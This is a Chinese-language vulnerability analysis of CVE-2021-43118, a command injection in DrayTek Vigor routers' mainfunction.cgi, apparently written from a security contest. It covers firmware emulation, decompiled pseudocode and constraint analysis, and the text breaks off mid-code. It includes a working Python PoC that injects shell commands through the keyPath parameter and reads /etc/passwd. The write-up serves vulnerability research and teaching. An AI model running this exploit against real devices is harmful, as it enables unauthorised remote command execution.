---
title: Vigor3900 CVE-2021-43118 命令注入漏洞分析
url: https://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458568320&idx=1&sn=434a0d45e0f50895b547dd72d30e0ec0&chksm=b18df60a86fa7f1cf06942df79ccdf355f11df0fbcd609b5a15bcf32411065130d366e4b4998&scene=58&subscene=0#rd
source: 看雪学苑
date: 2024-08-16
fetch_date: 2025-10-06T18:04:27.525717
---

# Vigor3900 CVE-2021-43118 命令注入漏洞分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8GHNVcJ05vxJbW3LckUsSHollPWI1p5caLxx8ELibO7UCQVay3ia1PJcq9NE6bFNpzbBufNvHW0rU5g/0?wx_fmt=jpeg)

# Vigor3900 CVE-2021-43118 命令注入漏洞分析

N1nE

看雪学苑

此固件是2024中国工业互联网安全大赛智能家电行业赛道选拔赛决赛的一道题目，其中就可以直接用CVE直接命令执行。本人对IoT一直在尝试学习，这次的比赛见到了很多师傅非常厉害，这也是一个非常好的让我深入IoT漏洞挖掘和利用世界的契机。所以我打算完整分析一次这个赛题/固件，希望大家都有所收获。

##

##

```
一

漏洞信息
```

DrayTek Vigor 是一款arm架构路由器。该路由器存在一个远程命令注入漏洞，攻击者可以利用该漏洞，通过在`mainfunction.cgi`中注入格式错误的查询字符串，构造恶意的 HTTP 消息，从而在远程执行任意代码。

**受影响版本：**

◆DrayTek Vigor3900 1.5.1.3

◆DrayTek Vigor2960 1.5.1.3

◆DrayTek Vigor300B 1.5.1.3

```
二

仿真
```

###

### 1. 基于qemu的Sevnup模拟启动

直接使用命令启动系统级固件模拟，成功。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxB3H1mxBJzUqhicHc3qMUnsVmtrHRFrlLibCnc8Y26gPd1V7mM1GsfurGQ/640?wx_fmt=jpeg&from=appmsg)

###

### 2. 找到服务并启动

使用命令`find ./ -name *.httpd`发现了几个httpd,其中主要是lighttpd。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxBk6anE8fGdmQg3q8ia5ElDwfUnibBNApa3ZIPwocn7VQeSACY5UjPtYcw/640?wx_fmt=jpeg&from=appmsg)

直接启动失败，说没有配置文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxBgvuyibMKIicj1XlQNLWOBTUAjFVuQVf6cAr0bLVspZVcmJKrMkvE0l5Q/640?wx_fmt=jpeg&from=appmsg)

尝试找配置文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxBHTfaaJlvVe8TVrLHUWQD8cusH54c3oSS4Aj5TeLcSWusACEk5f70HA/640?wx_fmt=jpeg&from=appmsg)

发现相关http的配置文件，尝试使用lighttpd的配置文件即可启动成功，命令如图。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxBWcoMLrVURySFcjj9mDWkBL8Rq7NkOnKJlf6rkXuyxSvvQvY1cw6e3g/640?wx_fmt=jpeg&from=appmsg)

发现http服务启动成功：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxBx6rDYl0rt3qneiaLmjBxibpDLYrT2p83C6EQ5FJXiaj85B345oibmyg0XQ/640?wx_fmt=jpeg&from=appmsg)

##

```
三

复现
```

我们首先获取网络上的POC脚本进行复现：

```
import requests
host='http://10.10.10.2'
def run_cmd(cmd):
    try:
        headers = {
            "UserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0)Gecko/20100101 Firefox/75.0"
            }
        url = host + "/cgi-bin/mainfunction.cgi"
        data = "action=login&keyPath=%27%0A%2fbin%2f" + cmd + "%0A%27&loginUser=a&loginPwd=a"
        res = requests.post(url=url, data=data, timeout=(10, 15),headers=headers)
        if res.status_code == 200:
            return res.text
        else:
            print('error')
            return 1
    except Exception as e:
        return ""

data=run_cmd('cat</etc/passwd')
print(data)
```

效果如下，说明仿真成功：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxBYVOXibulKWHZscmpqaptlncPvOnZGwfbWSTsFNZp0N3xDArjRm7icUibA/640?wx_fmt=jpeg&from=appmsg)

##

##

```
四

分析
```

###

### 1. 找到漏洞程序

主要使用了lighttpd运行了httpd服务，然而怎么处理得看上述找到的lighttpd.conf配置文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxBwuVkPhDuImyxGiaBSuVOiadmTAibqUXJku8UwkIQFXYQtNic2TgTky2xrQ/640?wx_fmt=jpeg&from=appmsg)

可以看到大概是有cgi-bin去处理相关逻辑的。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxB6O4vibuKmou0Vw0qtB0icFgpVmZOXdiaauMRCF5KJgPBaqCHWApljEBSg/640?wx_fmt=jpeg&from=appmsg)

我们可以看到，确实存在cgi-bin。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxBfU2zRtMgJYAJOdZ7icdqwuljkuRI1yliaTHicQMpFSyiclMp63O2pKXzFQ/640?wx_fmt=jpeg&from=appmsg)

接着我们就在这里看到了漏洞描述的文件`mainfunction.cgi`。接下来我们对其进行深入分析。

### 2. 找到命令注入点

我们可以通过搜索POC的keyPath找到对应位置（shift+f12,然后alt+t进行搜索）：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxBSnquA4ewIibkpWv6P0P51ia0PbLVGqYsB3tw7rd25C312ia70F9jGgSHw/640?wx_fmt=jpeg&from=appmsg)

点击进入后，查看其交叉引用（ctrl+x）：

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxB3UV2dZfWxL0qFJ7WFgjW2xNC9Gagt4DBA2FozbNM986bt7sgNQDkkg/640?wx_fmt=jpeg&from=appmsg)

显然第一个是有汇编指令LDR进行调用地方，我们双击进入并且F5反编译，得到头部伪代码如下：

```
haystack = getenv("HTTP_COOKIE");
  v0 = getenv("REMOTE_ADDR");
  strcpy(v38, "uci get acc_ctrl.access_control.validation_code");
  v1 = (char *)sub_21558(v38);
  strcpy(v38, "uci get acc_ctrl.access_control.fail_times");
  v2 = (const char *)sub_21558(v38);
  v35 = atoi(v2);
  v3 = (const char *)sub_20ECC(v0, ".", "_");
  snprintf(v38, 0x400u, "json -f /tmp/login_ip get ip.%s", v3);
  v4 = (const char *)sub_21558(v38);
  v36 = atoi(v4);
  Value = cgiGetValue(dword_42D0C, "keyPath");
  v6 = (const char *)cgiGetValue(dword_42D0C, "loginUser");
  v7 = cgiGetValue(dword_42D0C, "loginPwd");
  v8 = v6 == 0;
  if ( v6 )
    v8 = v7 == 0;
  v9 = (const char *)v7;
  if ( v8 || !Value )
  {
    v14 = cgiGetValue(dword_42D0C, "formusername");
    v17 = cgiGetValue(dword_42D0C, "formpassword");
  }
  else
  {
    v10 = off_42400[0];
    v11 = (const char *)sub_AD58(Value);
    snprintf(v40, 0x64u, "%s%s%s", v10, "_", v11);
    sub_AD58(v6);
    v12 = strlen(v6);
    v13 = sub_CEC4(v6, v12, v46);
    sub_CCC8(off_42404[0], v46[0], v13);
    snprintf(v38, 0x400u, "openssl rsautl -inkey '%s' -decrypt -in %s", v40, off_42404[0]);
    v14 = sub_21558(v38);
    sub_AD58(v9);
    v15 = strlen(v9);
    v16 = sub_CEC4(v9, v15, v46);
    sub_CCC8(off_42404[0], v46[0], v16);
    snprintf(v38, 0x400u, "openssl rsautl -inkey '%s' -decrypt -in %s", v40, off_42404[0]);
    v17 = sub_21558(v38);
    snprintf(v38, 0x400u, "rm -f '%s' '%s' '%s'", v40, off_42404[0], v33);
    system(v38);
  }
```

函数名称为 sub\_2AB3C。

我们点击进入cghiGetValue函数得到：

```
// attributes: thunk
int __fastcall cgiGetValue(int a1, int a2)
{
  return __imp_cgiGetValue(a1, a2);
}
```

应该是把对应数据的值传入a1中。

显然重点在于`system(v38);`。我们通过修复v38变量对最终作为命令传入的参数进行跟踪。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxBrGCJh3br6htbk6QoyWwZqyVAyneUy05iclFsInNCe1tloriamzeBc7ibw/640?wx_fmt=jpeg&from=appmsg)

从下网上看，我们发现cmd的一个部分str\_1来自v10与v11，我们考虑对其进行继续跟踪，改名为str11与str12。然而发现str11来自off\_42400,

为.data:00042400 C4 7E 03 00 off\_42400 DCD aTmpRsaPrivateK也就是/tmp/rsa/private\_key，而str12来自Value经过函数sub\_AD58的返回值。函数暂时不深究，我们继续向上回溯分析。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxB5ob8QA8Djt9X7WYn20NOeIoTmr6gFDQpvhGqHmZKmBQicJqA0ZRxaDg/640?wx_fmt=jpeg&from=appmsg)

然后我们发现，Value就是keypath的值。也就是说如果要传入命令必然经过keyPath。所以这就是注入点了。

### 3. 求解约束路径

在找到注入点之后，我们要分析，注入如何的数据能够走向执行system(cmd)的部分。我们标注key\_path传入的数据就是web\_cmd，我们可以看见，他会经过一个比较：

```
if ( v8 || !web_cmd )
  {
    v14 = cgiGetValue(web_cmd_buf, "formusername");
    v17 = cgiGetValue(web_cmd_buf, "formpassword");
  }
  else
```

注意到else才是我们能执行命令的位置：

```
else
  {
    str11 = off_42400[0];
    str12 = (const char *)sub_AD58(web_cmd);
    snprintf(str_1, 0x64u, "%s%s%s", str11, "_", str12);
    sub_AD58(v6);
    v12 = strlen(v6);
    v13 = sub_CEC4(v6, v12, v46);
    sub_CCC8(str_2[0], v46[0], v13);
    snprintf(cmd, 0x400u, "openssl rsautl -inkey '%s' -decrypt -in %s", str_1, str_2[0]);
    v14 = sub_21558(cmd);
    sub_AD58(v9);
    v15 = strlen(v9);
    v16 = sub_CEC4(v9, v15, v46);
    sub_CCC8(str_2[0], v46[0], v16);
    snprintf(cmd, 0x400u, "openssl rsautl -inkey '%s' -decrypt -in %s", str_1, str_2[0]);
    v17 = sub_21558(cmd);
    snprintf(cmd, 0x400u, "rm -f '%s' '%s' '%s'", str_1, str_2[0], str_3);
    system(cmd);
  }
```

所以我们要想办法满足`v8 || !web_cmd == false`才能够触发命令执行。

换句话说，`!web_cmd`我们传入之后他肯定是false了，我们只需要v8也是false即可，也就是说v8是空指针或者没有内容或者为0。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxByomKf261eHFrwmTlJ8JJA6rBlfPibIu4VmMxe0xeKddxhS9n8ibAvM9Q/640?wx_fmt=jpeg&from=appmsg)

他的类型是bool类型。

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/1UG7KPNHN8FSoGhzo0HbRdKE846iagMxBpVbuE8nZ5Hk8NY48ufkic1uHoyTPgw1CZfgn6omjJk44Q6R5shPaLBQ/640?wx_fmt=jpeg&from=appmsg)

注释给出他是zf,也就是0标志位。我们发现对于v8有几个关键的赋值：

```
v8 = Value == 0;
  if ( Value )
    v8 = v7 == 0;
```

首先v8为Value == 0的布尔值，我们希望v8是false,也就是说Value不是0,而且如果value有了的话，我们也希望v7不是0,这样就能确保v8为0了。

仔细观察发现web\_cmd\_buf其实依次从keyPath、loginUser、loginPwd取值，最后是从loginPwd取值到web\_cmd,Value,v7，所以我们这三个参数都要有,才能满足v8为false。

```
web_cmd = (unsigned __int8 *)cgiGetValue(web_cmd_buf, (int)"keyPath");
  Value = (unsigned __int8 *)cgiGetValue(web_cmd_buf, (int)"loginUser");
  v7 = cgiGetValue(web_cmd_buf, (int...